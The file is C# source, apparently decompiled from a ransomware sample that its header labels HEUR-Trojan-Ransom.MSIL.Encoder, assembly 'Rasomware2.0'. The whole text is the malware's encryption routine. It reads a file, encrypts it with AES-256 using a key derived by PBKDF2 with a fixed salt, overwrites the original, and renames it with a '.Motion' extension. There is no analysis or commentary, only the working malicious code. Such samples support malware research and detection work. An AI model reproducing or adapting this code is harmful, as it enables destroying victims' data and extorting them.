// Decompiled with JetBrains decompiler
// Type: Encrypt.Core.Encryption
// Assembly: Rasomware2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2779CBD6-B05D-4134-88E0-F6173B4E0DD8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-2ef5f5e60a1caf03985987de9c67e59a516184f2dcca56702620102cbeeb5ffe.exe

using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Encrypt.Core
{
  internal class Encryption
  {
    internal void File_Encryption(string _File, string _Password)
    {
      byte[] bytes = this.AES_256(File.ReadAllBytes(_File), _Password);
      File.WriteAllBytes(_File, bytes);
      File.Move(_File, _File + ".Motion");
    }

    private byte[] AES_256(byte[] _Bytes, string _IKey)
    {
      using (AesCryptoServiceProvider cryptoServiceProvider1 = new AesCryptoServiceProvider())
      {
        using (SHA256CryptoServiceProvider cryptoServiceProvider2 = new SHA256CryptoServiceProvider())
        {
          using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(cryptoServiceProvider2.ComputeHash(Encoding.BigEndianUnicode.GetBytes(_IKey)), new byte[8]
          {
            (byte) 170,
            byte.MaxValue,
            (byte) 187,
            (byte) 207,
            (byte) 204,
            (byte) 221,
            (byte) 223,
            (byte) 175
          }, 1000))
          {
            cryptoServiceProvider1.KeySize = 256;
            cryptoServiceProvider1.BlockSize = 128;
            cryptoServiceProvider1.Key = rfc2898DeriveBytes.GetBytes(cryptoServiceProvider1.KeySize / 8);
            cryptoServiceProvider1.IV = rfc2898DeriveBytes.GetBytes(cryptoServiceProvider1.BlockSize / 8);
            cryptoServiceProvider1.Mode = CipherMode.ECB;
            cryptoServiceProvider1.Padding = PaddingMode.PKCS7;
            return cryptoServiceProvider1.CreateEncryptor().TransformFinalBlock(_Bytes, 0, _Bytes.Length);
          }
        }
      }
    }
  }
}
